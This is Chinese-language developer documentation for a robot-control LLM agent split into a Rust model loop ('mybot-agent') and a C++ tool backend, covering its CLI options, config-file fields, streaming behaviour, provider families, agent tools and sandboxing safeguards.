# agent 体系（mybot-agent + --mcp-backend）

> **一句话**：管道模式是「给它一份剧本，它照着演一遍就下台」；agent 体系是
> 「**让它一直站在台上**，由大模型看着可用剧本，一步一步决定下一段演什么」。

> **拓扑变更（2026-09-24，agent 循环迁 Rust）**：agent 体系现为**两个进程**——
> C++ 宿主 `mybot --mcp-backend` 提供**工具后端**（硬件上电常驻，工具调用经
> AF_UNIX socket 同步服务），Rust `mybot-agent`（`agent/` 目录，rig 驱动）
> 承担**模型循环**（REPL / `--task` / 预算 / 历史裁剪 / 审计 model 行），直连
> provider，经 `--socket` 调用后端。原 C++ 单进程 `--agent` 模式（模型调用是
> 一颗 Lua 驱动）已移除：`mybot --agent` 会被显式拒绝（退出 2）并给出指引；
> 模型侧参数（`--task` / `--llm-*` / `--prompt-file` / `--session-file` /
> `--resume`）是 `mybot-agent` 自己的选项（见 `mybot-agent --help`）。
> 预算、审计、图片后注与提示词定界由两端分工实现；设计决策与沿革存档见 [design/decisions.md](design/decisions.md)，
> 不代表现役调用链。当前模型侧行为以 `agent/src/` 为准。

## 目录

- [与管道模式的差别](#与管道模式的差别)
- [快速开始](#快速开始)
- [交互式 REPL](#交互式-repl)
- [流式与阻塞的如实偏差](#流式与阻塞的如实偏差)
- [命令行参数](#命令行参数)
- [配置文件（推荐）](#配置文件推荐)
- [模型调用（Rust 直连；Lua 协议驱动轨道已删）](#模型调用rust-直连lua-协议驱动轨道已删)
- [给智能体的工具](#给智能体的工具)
- [摄像头：capture_image](#摄像头capture_image)
- [提示词包：绑定机器人身份](#提示词包绑定机器人身份)
- [审计轨迹：--audit-log](#审计轨迹--audit-log)
- [录制模式与训练集导出：--record](#录制模式与训练集导出--record)
- [会话持久化：--session-file / --resume](#会话持久化--session-file----resume)
- [远程对话（已评估，不做）](#远程对话已评估不做)
- [出站 HTTP：http_fetch](#出站-httphttp_fetch)
- [策略钩子：--agent-policy](#策略钩子--agent-policy)
- [工具后端：--mcp-backend（agent 体系的 C++ 半边）](#工具后端--mcp-backendagent-体系的-c++-半边)
- [安全说明（请务必读）](#安全说明请务必读)
- [源码分层](#源码分层)
- [测试](#测试)
- [已知限制](#已知限制)

## 与管道模式的差别

| | 管道模式（默认） | agent 体系（后端 + mybot-agent） |
| --- | --- | --- |
| 主流程 | 读一段 `.mt` → 逐行重放 → 退出 | 大模型工具循环，多轮决策后才退出 |
| 硬件生命周期 | `active()` → `run()` → `deactivate()`，一次性 | 后端 `active()` → **常驻** → 后端停机才 `deactivate()`（Rust 退出不自动断电） |
| 动作脚本数量 | 一次一段 | 任意多段，逐个由智能体挑选执行 |
| 输入源 | `--tcp` / `--input` / stdin | mybot-agent 的 stdin 交互 REPL 或 `--task` 一次性 |
| 决策者 | 写脚本的人 | 大模型（受提示词与工具边界约束） |

两种形态**互斥**：`--mcp-backend` 与 `--tcp` / `--input` 同时给会被显式拒绝
（退出码 2）；`--agent` 则已移除（见顶部横幅）。

## 快速开始

无硬件示例（工具使用虚拟继电器，Rust 会调用所配置的真实模型；纯离线回归见「测试」）。
**Rust 的 endpoint、model 与密钥都必须显式配置**：

```bash
bash scripts/build_agent.sh      # 一次：构建 Rust agent（产物 agent/target/release/mybot-agent）

# 终端 1：工具后端（虚拟继电器，无硬件；硬件上电常驻）
./build/mybot --robot=robots/relay-test.sql --mcp-backend \
    --mcp-socket /tmp/mybot.sock --scripts-dir scripts

# 终端 2：agent（交互 REPL；密钥与模型配置给 mybot-agent）
export BOT4CJ_LLM_KEY=sk-xxx
export BOT4CJ_LLM_ENDPOINT=https://你的接入点/v1/chat/completions
export BOT4CJ_LLM_MODEL=你的模型名
./agent/target/release/mybot-agent --socket /tmp/mybot.sock
# 在 REPL 提示符后输入：让继电器动作一次
```

一次性任务（同一后端，agent 侧加 `--task`）：

```bash
export DEEPSEEK_API_KEY=sk-xxx
./agent/target/release/mybot-agent --socket /tmp/mybot.sock \
    --llm-endpoint https://api.deepseek.com/chat/completions --llm-model deepseek-chat \
    --task "让机器人站起来"
```

配置链（命令行 > 环境变量 > `mybot.llm.json` > 内置缺省）与配置文件格式见
[mybot.llm.json.example](../mybot.llm.json.example)——`mybot-agent` 与后端读同一份。

## 交互式 REPL

缺省进入交互循环，提示符形如 `mybot[spider1|llm0|14hw]>`（机器人名称 + LLM 变量名 + 硬件数），
每轮输入一条自然语言任务，模型循环调工具直至完成或失败。

**进度提示**（2026-09-24）：Rust agent 在交互 REPL 的模型调用期间显示"思考中..."动画
（每 500ms 更新），首个 delta 到达（或阻塞面返回）后自动清除；`--task` 不显示动画。
C++ 后端不参与模型请求。

**流式输出**（2026-09-25 起缺省）：模型文本按服务端 SSE 的 delta 逐段打到 stdout
（每段随即 flush，管道下游立刻可见），工具调用轮之间换行分隔。要退回「整轮生成完
再整段打印」的阻塞面，用 `--llm-no-stream` 或配置文件 `"stream": false`；`/status`
的「输出模式」行与 `--check-config` 摘要都如实呈现当前面。两种面的行为差别见
下文「流式与阻塞的如实偏差」。

REPL 内置命令：`/hardware` 打印硬件清单，`/scripts` 打印动作脚本清单，
`/sql <语句>` 直接执行结构 SQL——只读语句（`SELECT` / `SHOW TABLES`）路由到
`query_sql`、含变更语句（`CREATE` / `INSERT` / `DELETE` / `DROP` / `UPDATE`）
路由到 `apply_sql`（仍受 `--agent-hot-sql` 门控；方言与安全边界见 [dsl.md](dsl.md)），
`/status` 打印**会话状态一览**（历史大小与任务块数、是否裁过、任务内预算用量、
本会话模型/工具轮数与失败数、最近一次 token 用量、超时与轮次上限、审计落点与
session id、硬件变量数；只读，**不触发任何模型调用**——SAN-10，2026-09-22），
`/clear` 清空对话记忆（**硬件保持上电**、系统提示词不变——上下文被错误结论
污染后不必重启进程丢掉常驻状态，C1，2026-09-22），`/exit`（或 `/quit`、Ctrl-D）退出。

**行编辑与历史**（2026-09-25，`agent/src/linein.rs`，rustyline）：stdin 与 stdout **都是终端**
时提示符带行编辑——方向键移动、Ctrl-A/E/W/U、↑↓ 翻历史、Ctrl-R 搜索、`/命令` Tab 补全
（只补内置命令，任务文本是自然语言没有候选集）；提示符处 **Ctrl-C 清掉当前行**继续
（raw 模式下终端不发 SIGINT，退出仍是 `/exit` 或 Ctrl-D），模型轮进行中终端已还原、
Ctrl-C 照常走下段的取消路径。历史跨会话保留在 `$XDG_STATE_HOME/mybot-agent/history`
（未设则 `~/.local/state/mybot-agent/history`），目录 0700 / 文件 0600 建立，上限 1000 条，
`BOT4CJ_AGENT_HISTORY=<路径|none>` 改位置或关闭；任务文本可能含现场信息，已存在的文件
若对同组/其他用户可读会提醒（不擅自改权限）。**任一端不是终端**（管道、重定向、E2E）
则走裸逐行读，提示符原样写 stdout、一行一任务、EOF 退出——与此前行为逐字节一致，
不读不写历史文件。
首次 SIGINT/SIGTERM 使 mybot-agent 置停止标志，在检查点停止后续模型轮、重试与
工具派发；REPL 正常收尾写 end 行、退出 0，`--task` 若返回中断错误则写 error 行、退出 1。
**在飞的模型请求随即被丢弃**（2026-09-25 起：阻塞面与流式首帧在 `select!` 里对停止
标志定时轮询，流式余流在每次等待下一帧时检查；延迟 ≤ 一个轮询周期，不再等服务端
吐完或 `--llm-timeout` 到期），本轮以「请求被中断」收场；退避等待同样即时中止。
第二次信号立即退出 130（跳过清理）。停止 Rust 进程**不会自动停止后端**：需另向后端
发送 SIGINT/SIGTERM，待服务循环退出并执行 `deactivate()` 才断电；阻塞的硬件调用可能延迟清理。
原 C++ 侧的「取消哨兵文件」（libcurl 进度回调轮询，P2a/AG-27）已随旧模型调用路径移除。
现役回归见 `scripts/agent_e2e.sh`（R8b：信号后 **5s 内**进程退出的守门上限、0 条慢响应）/ `scripts/mcp_e2e.sh`。

## 流式与阻塞的如实偏差

流式（缺省）与阻塞（`--llm-no-stream` / `"stream": false`）走同一套重试、超时、
审计与会话记账，最终回答逐字节一致（R15 守门 `cmp`）；以下是两者**确实不同**的地方：

- **中间轮文本**：模型在工具调用轮里顺带说的话，流式面**边到边打**（各轮之间换行），
  阻塞面只打最终回答。前者对操作者更透明，代价是 `--task` 的 stdout 不再只含最后一段。
- **思维链**：`reasoning`/`reasoning_content` 的 delta **不打印**（与阻塞面一致，
  只有正文进 stdout；stdout 是模型输出的保留通道，思维链既非输出也非日志）。
- **中途失败不撤回**：首帧之后断流（网络断、服务端 5xx 中途出错、帧间空闲超
  `--llm-timeout`）**不重试**——已打出的文本收不回来，重试会让操作者看到两段拼接；
  本轮以错误收场，stderr 报原因。重试只覆盖**首帧之前**：非 2xx、连接失败、首帧超时
  按与阻塞面同一张表分类（429/5xx/连接类可重试，其余 4xx 不可）。
- **首帧前的连接类错误按瞬时处理**：rig 的 SSE 错误以 `ProviderError` 形态到达，
  拿不到 curl 错误码那样的细分；判据是「尚无字节被看到，重试不改变已见结果」。
- **流式 429 没有 `Retry-After`**：rig 的 SSE 错误只带状态码不带响应头，退避只按本地
  指数（阻塞面仍取服务端值与本地值之大者）。
- **超时语义**：阻塞面 `--llm-timeout` 封顶整次请求；流式面它封顶**首帧**与之后
  每两帧之间的空闲，长回答只要持续出字就不会被切。
- **审计 model 行**由流适配器在流结束/出错/被丢弃时落，token 用量取 provider 的收尾
  帧（OpenAI 末尾 usage 块、Anthropic `message_delta.usage`）；provider 不给就记 0，
  不推算——口径与阻塞面相同。
- **Ctrl-C** 在两个面都即时丢弃在途请求（上节），这一条不再是偏差。

## 命令行参数

**下面是 C++ 工具后端 `mybot --mcp-backend` 的选项**：脚本目录、摄像头、
`--read-var`、危险能力开关与 `--agent-policy` 都给后端，不给 Rust。
`--task`、`--prompt-file`、`--llm-*`（含 `--llm-config`）、`--session-file`、
`--resume` 则只给 `mybot-agent`。Rust 选项使用 `--选项 值` 写法，详见其 `--help`。
两端都有 `--audit-log` / `--check-config`，但各管本进程：Rust 记录模型/会话审计，
配置校验在连接后端之前返回；后端校验行为见表。
出站 HTTP 的三个选项 `--allow-host` / `--http-fetch-timeout` / `--http-fetch-max-bytes`
也只给 `mybot-agent`（`http_fetch` 是 Rust 本地工具，不经后端），见
[出站 HTTP：http_fetch](#出站-httphttp_fetch) 一节。录制的三个选项
`--record` / `--record-dir` / `--record-max-bytes` 同理只给 `mybot-agent`
（同样只有命令行入口），见[录制模式](#录制模式与训练集导出--record)一节。

| 参数 | 说明 | 缺省 |
| --- | --- | --- |
| `--scripts-dir <目录>` | 动作脚本根目录，也是智能体可执行路径的**沙箱边界** | `scripts` |
| `--agent-shell` | **显式开启** `run_command`（任意 shell 执行）；须有 policy 且 `require_confirm` 包含 `run_command` | **不提供**（见「安全」节） |
| `--agent-hot-sql` | **显式开启** `apply_sql`（结构 SQL 带电生效：`CREATE TABLE`/`INSERT INTO` 立即装配、上电，失败整批回滚）；须有 policy 且 `require_confirm` 包含 `apply_sql` | **不提供**（见「安全」节第 10 条）；只能由后端命令行授权，配置文件不能自行开启 |
| `--agent-policy <路径>` | 策略钩子文件（严格 JSON）：命中 `require_confirm` 的工具每次调用先过**外部确认程序**；也可由后端配置的 `agent_policy` 指定 | 未开危险能力时可不启用（见「策略钩子」节） |
| `--read-var <变量名>` | 声明一个**可读**硬件变量，**可重复**；注册 `read_variables` 与 `wait_variable` 工具（缺省**不提供**这两个工具）。只有已注册且种类为 `lua`（驱动）或 `daemon`（守护快照）的名字生效——执行器与传感器同属 `kind=lua`，靠种类分不出，故必须由人列名（见「工具」表与安全说明第 12 条） | 不提供（即无回读能力；声明了名字但一个都不可读时也不提供） |
| `--fs-root <目录>` | **list_dir / read_file 的只读根目录**（Phase 4）；注册这两个只读文件工具（与硬件/shell 无关）。路径沙箱见 `agent_sandbox.hpp`（见「工具」表与安全说明第 13 条） | 不提供（即无这两个工具）；**只能命令行给**，配置文件写 `fs_root` 会被拒绝加载 |
| `--agent-write-file` | **显式开启** `write_file`（Phase 5）：在 `--fs-root` 根之内创建/覆盖文本文件（先写同目录临时文件再原子落地：新建用 `link`、覆盖用 `rename`；符号链接目标拒绝；已存在须显式 `overwrite:true`；落地权限 0600）。**依赖 `--fs-root`**（只给本开关会在上电前报错退出 2）；须有 policy 且 `require_confirm` 包含 `write_file`（见「工具」表与安全说明第 14 条） | 不提供（即无写文件能力）；**只能命令行给**，配置文件写 `allow_write_file` 会被拒绝加载 |
| `--camera-var <变量名>` | 承载摄像头驱动的变量名 | `cam0` |
| `--camera-device <路径>` | 摄像头设备（需支持 MJPEG；驱动只放行 `/dev/videoN`） | `/dev/video0` |
| `--camera-src <图片>` | 模拟图片来源：不接摄像头也能跑通「拍照 → 进上下文」。**命令行**给的 src 以其所在目录为白名单根；配置文件给的 `camera_src` **不**推导根（见安全说明第 9 条），需配 `--camera-src-dir` 或 `BOT4CJ_CAMERA_SRC_DIR` | — |
| `--camera-src-dir <目录>` | `capture_image` 模拟图片的白名单根目录（优先级高于推导）。**只能命令行给**，配置文件写 `camera_src_dir` 会被拒绝加载 | — |
| `--no-camera` | **不**注册 `capture_image`（去掉拍照能力） | 关（默认注册，前提是该变量解析到 Lua 驱动，见安全说明第 5 条） |
| `--check-config` | **只校验配置并打印摘要后退出 0**：不装载结构脚本、不上电、不发起任何网络请求。配置文件拼错时不必真起一次会话（接了硬件也不必反复上下电）。失败退出 2（判据仍是 `buildAgentConfig` 那一套，不另立）；会**打开但不写入**审计日志文件（顺带验证其可写） | 关（照常进入会话） |
| `--audit-log <路径>` | 审计轨迹落点（JSON Lines 追加写；`-` = stderr） | 不记录（见「审计轨迹」节） |

对支持相应入口的字段，取值优先级是：**命令行 > 环境变量 > 配置文件 > 内置缺省**。
Rust 的 endpoint、model 与 API key 必须提供，没有内置回退值。
API key 没有命令行入口（只从环境变量或配置文件取）：argv 对同用户进程可读（`/proc/<pid>/cmdline`）。

C++ 对 `--agent` 及上述 Rust 专属选项一律拒绝（退出码 2），即使同时给了
`--mcp-backend` 也不例外。表中后端选项不带 `--mcp-backend` 同样被拒；
后端与 `--tcp` / `--input` 互斥。后端 `--check-config` 仍须 `--robot`，
但无需 `--mcp-socket`；Rust `--check-config` 仍须 `--socket`，不会实际连接它。

## 配置文件（推荐）

目标 URL、API key、模型等信息可放在 JSON 配置里。Rust 用 `--llm-config` 指定，
C++ 后端显式指定配置只能用环境变量 `BOT4CJ_LLM_CONFIG`（不接受 `--llm-config`）：

```json
{
  "driver": "LlmOpenAI",
  "endpoint": "https://moma.cmecloud.cn/v1/chat/completions",
  "model": "zhipu/glm-5.3-flash",
  "api_key": "sk-xxx",

  "timeout": 180,
  "max_tokens": 4096,
  "temperature": 0.7,
  "top_p": 0.9,
  "reasoning_effort": "",
  "thinking": "",

  "max_turns": 8,
  "max_task_seconds": 900,
  "scripts_dir": "scripts",
  "allow_shell": false,
  "prompt_files": ["prompts/spider_robot"]
}
```

以下两组任选其一；两端各自查找配置，不会经 socket 同步配置文件：

```bash
# 自动查找：终端 1（工具后端）
./build/mybot --robot=robots/spider1.sql --mcp-backend --mcp-socket /tmp/mybot.sock
# 自动查找：终端 2（Rust agent）
./agent/target/release/mybot-agent --socket /tmp/mybot.sock
```

```bash
# 显式指定同一份配置：终端 1（工具后端）
BOT4CJ_LLM_CONFIG=/etc/mybot/llm.json ./build/mybot --robot=robots/spider1.sql \
  --mcp-backend --mcp-socket /tmp/mybot.sock
# 显式指定同一份配置：终端 2（Rust agent）
./agent/target/release/mybot-agent --socket /tmp/mybot.sock --llm-config /etc/mybot/llm.json
```

- **查找顺序**：Rust 为 `--llm-config` → `BOT4CJ_LLM_CONFIG` → `./mybot.llm.json` → `./mybot.llm.conf.json` → `$HOME/.config/mybot/llm.json`；C++ 后端从 `BOT4CJ_LLM_CONFIG` 开始，其余顺序相同。可不使用配置文件，但 Rust 仍须从环境变量/命令行取得 endpoint、model 与密钥。
  两端的 `--check-config` 摘要可分别核对实际配置路径，Rust 校验不替代后端能力校验。
- **显式关闭**：Rust 用 `--llm-config none` 或 `BOT4CJ_LLM_CONFIG=none`；C++ 后端只能用 `BOT4CJ_LLM_CONFIG=none`。环境变量须分别传给对应进程。
  缺省查找依赖各进程的 CWD，同一份命令换台机器可能读到不同配置——CI/守门/复现问题时应显式关掉或显式指定。
- **字段归属**：Rust 消费模型、提示词、会话、模型重试及上下文预算字段；摄像头、脚本目录、工具超时、能力门控与策略由后端消费。两侧对对方的专属字段都只登记为已知字段、不解析或授权（Rust 对后端专属字段如此；2026-10-01 批次 A 后 C++ 后端对模型侧字段同样只经白名单不解析——模型侧的类型/值域校验是 mybot-agent 的独占职责）；以下能力字段的拒绝规则由后端执行。`audit_log` 两端各自生效。
- **字段**：`driver` `var` `endpoint` `model` `api_key` `api_key_file` `timeout` `max_tokens`
  `temperature` `top_p` `reasoning_effort` `thinking` `stream` `max_turns` `max_task_seconds` `scripts_dir`
  `allow_shell` `allow_hot_sql` `allow_write_file` `prompt_files` `camera_var` `camera_device` `camera_src` `camera_src_dir` `allow_camera` `audit_log`
  `agent_policy` `read_vars` `fs_root` `session_file` `max_history_bytes` `max_task_tool_result_bytes` `max_task_image_bytes`
  `max_calls_per_round` `max_retries` `retry_backoff_ms` `run_command_timeout_sec`
  `run_command_max_timeout_sec` `action_script_timeout_sec` `history_summary` `max_summary_bytes`。
  配置文件字段均可省略；Rust 必需的 endpoint、model、密钥须由其他入口补齐。
  `max_tokens` 是单次模型响应的 token 上限（1..200000），有命令行旗标
  `--llm-max-tokens`；`timeout` / `max_turns` / `max_task_seconds` 同理对应
  `--llm-timeout` / `--llm-max-turns` / `--llm-task-timeout`——这四个数值旗标
  给出即**覆盖**同名配置字段（命令行 > 配置文件，值域校验同配置口径）。
  `stream`（布尔，缺省 `true`）选择模型输出面：流式逐 delta 打印或阻塞整段打印，
  命令行 `--llm-no-stream` 优先；只有 Rust 消费，C++ 后端仅登记为已知字段。
  空串按「未配置」处理；`prompt_files` 为字符串数组（每项为文件或目录，语义同
  `--prompt-file`），空数组按「未配置」。`allow_shell` / `allow_hot_sql` **不能授权开启能力**：
  未给对应后端开关却写 `true` 会退出 2；开启 `run_command` / `apply_sql` 必须分别显式给
  `--agent-shell` / `--agent-hot-sql` 并通过 policy 校验，配置中的 `false` 不覆盖已给的命令行开关。
  `session_file` 是**只用于写入**的字段：`--resume`（恢复）是输入通道，
  只认命令行给出的路径——配置文件不能授权一次「把文件内容读进模型上下文」，
  与下面 `camera_src_dir` / `read_vars` 同判据（写它本身不报错，仅不参与恢复）。
  `camera_src_dir` 与 `read_vars` 则**一律拒绝**（写了就退出 2，无论命令行给不给）：
  它们分别决定"能读哪个目录"与"能读哪些硬件变量"，属**放宽读权限**的字段，
  只能由命令行 `--camera-src-dir` / `--read-var` 提供（理由见第 9、12 条）。
  `fs_root` 同判据（理由见第 13 条）：只能由命令行 `--fs-root` 提供，写进配置文件
  同样一律拒绝加载并退出 2。`allow_write_file` 同判据（理由见第 14 条）：只能由命令行
  `--agent-write-file` 授权，未给该命令行开关时配置文件写 `true` 会拒绝加载并退出 2；
  命令行已授权时配置里的同向 `true` 不报错（授权来自命令行，与 `allow_shell` 同款）。
  三个 `max_*_bytes` 字段是**上下文字节预算**（单位字节，`0` = 不限，上限 64 MiB）：
  `max_history_bytes` 会话历史（缺省 4 MiB）、`max_task_tool_result_bytes` 单任务内
  文本（缺省 2 MiB）、`max_task_image_bytes` 单任务内图片（缺省 4 MiB）。原为编译期
  常量只能改源码缺省，B1（2026-09-22）起可由配置文件覆盖——现场调上下文预算不再需要重编。
  口径（C4）：预算记账**不含** system 提示词（另有 64 KiB 独立上限）与工具 schema，
  估重是线上字节的下界——请求体真实总量略高于预算，量级仍远低于常见网关限额。
  `history_summary`（布尔，缺省 `true`）与 `max_summary_bytes`（256-1048576，缺省 8192）
  控制**历史摘要**（2026-09-25，只有 Rust 消费，C++ 后端仅登记为已知字段）：被
  `max_history_bytes` 裁掉的任务块交给同一个模型压成摘要，挂在系统提示词末尾（见下文
  「历史裁剪与摘要」）；`false` 退回纯整块裁剪。摘要正文超出 `max_summary_bytes` 时在
  字符边界截断并告警。`max_history_bytes` 为 0（不裁剪）时摘要无从发生。
  另有六个**运行期数值**（B4 的五个 + PL-2 的动作脚本预算，入口同样只有配置文件这一层）：

  | 字段 | 区间 | 含义与缺省 |
  | --- | --- | --- |
  | `max_calls_per_round` | 1-1024（**拒绝 0**） | 单轮向物理机器人下发动作数的上限，缺省 16。`0` 在下游是「不限」的旧语义，对机器人没有正当用法，配置文件不得放宽（与 `allow_shell` 同源口径）。超限时**只派发前 N 条**，其余折叠成一句说明**追加进该轮 assistant 的文本**（不额外产生 `tool` 消息——`tool_call_id` 必须与 assistant 声明的调用一一对应），同时往日志打一行 `[上限] …已丢弃 K 条未派发`：模型与操作者都必须知道被截断了（SAN-1/SAN-8） |
  | `max_retries` | 0-6 | 模型调用失败（**网络类与限流**）的**尝试次数（含首次）**，缺省 3。`0` = 只发一次不重试——离线/内网直连想立刻失败时用。可重试判据在 Rust 侧按 rig 的 `CompletionError` 分类（`agent/src/model.rs` 的 `classify`）：429（限流，退避尊重 `Retry-After`）与 5xx 可重试、其余 4xx 不可（重试不会改变结果，只烧配额）；无 HTTP 状态时，连接/传输类错误与单次调用超时（`ModelTimeout`）可重试（SAN-3，2026-09-22） |
  | `retry_backoff_ms` | 0-10000 | 重试退避基础时长（指数增长），缺省 1000；单次退避另有 60s 上限，防止放宽区间后算出小时级等待。**被限流时（429）改用服务端 `Retry-After`**，与本地指数退避取较大值，日志点名来源；该值钳到 1s-5min（SAN-3） |
  | `run_command_timeout_sec` | 1-600 | `run_command` 的缺省超时，缺省 10 |
  | `run_command_max_timeout_sec` | 1-3600，且 **≥ 上一个** | 模型经 `timeout_seconds` 能请求的上限，缺省 60 |
  | `action_script_timeout_sec` | 0-3600 | 动作脚本执行预算（PL-2，2026-09-22），缺省 180（与单次模型调用缺省取齐）；**0 = 显式关闭预算**（危险：失控驱动会让会话永久卡住） |

  后两者按**生效值**校验「上限 ≥ 缺省」：只配上限而它低于缺省（例如只写
  `run_command_max_timeout_sec: 5`）会被拒绝加载——否则模型不传 `timeout_seconds`
  时按缺省请求 10s 会越过操作者声明的 5s 上限。这两个数字也会同步进 `run_command`
  的工具描述，模型看到的「默认/最大」始终是生效值。

  重试动作本身写**日志流**（stderr，含第几次尝试、退避时长与驱动给的成因）：
  工具日志（`[工具] …`）、REPL 日志与它是同一条流——**恒开，没有开关**
  （`--verbose` 从来不是本项目的选项，见 [reference.md](reference.md) 的选项表）；
  **stdout 只放模型回答**（`--task` 的输出不能被日志污染）。
  **SAN-5（2026-09-22）**：动作脚本执行的框架回显（`----------` 分隔线与驱动结果表）
  原先走 `std::cout`，污染了这条约定——现已改走 stderr（回显没丢，只是换了流）。
  **D（2026-09-23）**：agent 模式下 `run_action_script` 的执行窗口内，这段回显改为
  回收进该次工具**回执**（随 `tool` 消息进模型上下文，见下「给智能体的工具」），
  因此窗口内它不进 stderr；窗口外（管道模式、`capture_image` 的 `playQuiet` 路径）
  照旧写 stderr，行为不变。
  残余**如实声明**：Lua 驱动自己 `print()` 的进度行（如 `Relay.lua` 的
  `Relay: test=… -> delay=…`、`drv_common` 的 VIRTUAL HARDWARE 横幅）**仍然走 stdout**,
  48 个在库驱动都是这个写法；要彻底干净得让驱动经统一的输出辅助函数打印，
  属独立一项（未做）。所以 `--task` 的 stdout 契约是"宿主不往里写东西"，
  而不是"里面只有模型回答"——接管道时请以此为准。
- **严格解析**：不是合法 JSON、字段类型/范围不符、**出现未知字段**一律拒绝并退出 2。
  拼错一个键（如 `apikey`）而静默走缺省，会让人以为配置生效了——与「未知 `--key` 退出 2」同一口径。
- **密钥可以放在别处**：`api_key_file` 指向一个只存密钥的文件（末尾换行会自动剥掉）。
  若该文件或内联了 `api_key` 的配置文件对同组/其他用户可读，启动时会打印 `chmod 600` 提醒（只提醒，不阻断）。
- **别提交密钥**：仓库 `.gitignore` 已忽略 `mybot.llm.json` / `*.llm.json`；
  模板见仓库根的 `mybot.llm.json.example`。
- **厂商特有字段**（如 DeepSeek 的 `thinking` / `reasoning_effort`）与 `driver`/`endpoint`/`model`
  一样，都是 Rust agent 配置里的**已承认字段**（`agent/src/config/file.rs` 的
  `PARSED_FIELD_NAMES`（由 `parsed_fields!` 宏表展开）+ `KNOWN_UNPARSED_FIELDS` 两个清单，
  与 C++ `src/llmconfig.cpp` 的 `kKnown` 同集合，双端同判据拒绝未知字段）；C++ 后端不消费模型侧字段
  （`mergeLlmLayer` 的有意早退）。协议差异全部属于 Rust 侧的 provider 实现。

## 模型调用（Rust 直连；Lua 协议驱动轨道已删）

`mybot-agent`（Rust，rig 0.42）直连 provider，不经任何 Lua 驱动：
`agent/src/provider.rs` 内置三族（OpenAI 兼容 / DeepSeek / Anthropic），
`--llm-driver` 选的是**协议族名**（`LlmOpenAI` / `LlmDeepSeek` / `LlmAnthropic`）。

> **2026-09-25 #8 起这三个名字不再是 `modules/<表名>.lua` 的驱动表名**：
> Lua 协议驱动轨道（`modules/Llm*.lua` + `modules/lib/llm_*.lua` + 两个离线用例 +
> `test_curl_consts`）整条删除——agent 会话自 2026-09-24 批次 B 起就走 Rust 直连，
> 那条轨道的唯一潜在用途是「结构脚本声明成普通硬件变量供 `.mt`/`@Daemon` 直调」，
> 而仓库内外零处这么用（完整评估见提交 c1e25f1）。现役含义：C++ 宿主
> **不加载任何 LLM 驱动**，只把协议族名透传给 agent（配置文件的 `driver` 字段
> 在双端 `--check-config` 镜像里仍可见）；`--llm-driver`/`--llm-var` 属于
> Rust agent，C++ 后端照旧拒绝（退出 2）。

```
mybot-agent（Rust）     模型循环（provider.rs 直连 provider：reqwest + rustls）
  └─ frame.rs/bridge.rs  帧协议 ⇄ mybot --mcp-backend（工具调用）
```

### 三个协议族

| 族名 | 接入点（缺省） | 模型（缺省） | 特点 |
| --- | --- | --- | --- |
| `LlmOpenAI` | **无缺省（必须显式配置，B2）** | **无缺省（rig 需要显式模型串）** | OpenAI 兼容 |
| `LlmDeepSeek` | **无缺省（必须显式配置）** | **无缺省** | DeepSeek：思考模式 + `reasoning_content` 回传 |
| `LlmAnthropic` | **无缺省（必须显式配置）** | **无缺省** | Anthropic Messages：`system` 顶层字段、`tool_use`/`tool_result` 块、`x-api-key` 鉴权 |

> **【破坏性变更，B2（2026-09-22）】`LlmOpenAI` 不再内置缺省接入点**：原缺省指向
> 特定第三方网关（moma.cmecloud.cn），「什么都没配就跑起来」的会话会把含结构
> 脚本、硬件清单、摄像头画面的上下文静默发往该网关——stderr 注记只是缓解不是
> 防线。Rust 侧 fail-closed（`config.rs` 构建期拒绝）：endpoint 与 model 都**没有
> 内置缺省**，缺任一即报错点名配置途径（`--llm-endpoint` / 环境变量
> `BOT4CJ_LLM_ENDPOINT` / 配置文件 `endpoint` 字段），不发出任何报文；
> 真要用原网关的人显式配置即可。

三族的协议差异全部收敛在 Rust 侧 rig 的 provider 实现里（DeepSeek 的
`reasoning_content` 逐轮回传、Anthropic 的 `tool_use`/`tool_result` 成对与
`x-api-key` 头），回归由 `scripts/agent_e2e.sh` 的假模型服务守（R12/R13，
见 [testing.md](testing.md)）。C++ 宿主对 provider 报文字段**一无所知**。

## 给智能体的工具

| 工具 | 作用 | 关键约束 |
| --- | --- | --- |
| `list_action_scripts` | 列出 `--scripts-dir` 下全部 `.mt`（相对路径 + 首行说明）；符号链接条目不列 | 只读 |
| `run_action_script` | 在**常驻**机器人上执行指定 `.mt`；回执除「已执行」外还带**驱动返回表**（器件读数，如 `{"result":"OK","slept":200}`）——执行窗口内的框架回显被回收进回执，模型因此看得见读数（D，2026-09-23）；上限 8 KiB，超限截断并显式标注。可选 `vars`（对象，键=变量名、值=字符串或数字）：**调用时临时注入会话别名**，脚本里写 `$(键)` 的地方就地取该值，作用域限本次执行、出口即撤销（#34 条件反射「像函数调用传实参」的工具侧入口）——于是一个参数化脚本（如 `sim_turn.mt` 内 `turn $(deg)`）配 `vars={"deg":35}` 即可精确转任意角度，无需为每个值各写一个脚本；多个键亦可（如 `sim_jump.mt` 内 `jump $(dist) $(height)` 配 `vars={"dist":0.8,"height":0.35}` 前跳并控起跳高度）；`vars` 在脚本内联 `@Alias`/`@Vars` 注册**之后**绑定，故调用方实参覆盖脚本内同名默认值 | `script` 只允许 `--scripts-dir` 下的相对路径；拒绝绝对路径、`..`、非 `.mt`、**符号链接**；单文件 8 MiB 上限。`vars` 的键须为安全标识符（`isSafeIdent`）、且不得是被结构引用的 controller/trigger 名（`override` 的 N-6 判据），值须字符串或数字（拒 NUL）；违规按**参数错误**回传（`executed=false`，不谎报「停在半途」）。漏传脚本引用的 `$(键)` → 执行响亮报「expression references '<键>'」，不静默用 0 |
| `list_hardware` | 列出结构脚本注册的硬件变量（名字 + 种类） | 只读清单；**不**调用 `read()`/`play()`，绝无副作用 |
| `read_variables` | **主动读**硬件变量的当前值（无参数，一次读全部可读变量）：传感器读数、守护最近一次采样 | **缺省不注册**：可读集合由 `--read-var` 声明（命令行独占），只读 `playQuiet`，且只放行 `lua`/`daemon` 两种种类——执行器与传感器同属 `kind=lua`，靠种类分不出，故由操作者列名（安全说明第 12 条）。单个变量读失败写在该行、不中断整次读取；回执 8 KiB 上限、超限截断并标注、按「数据不是指令」定界 |
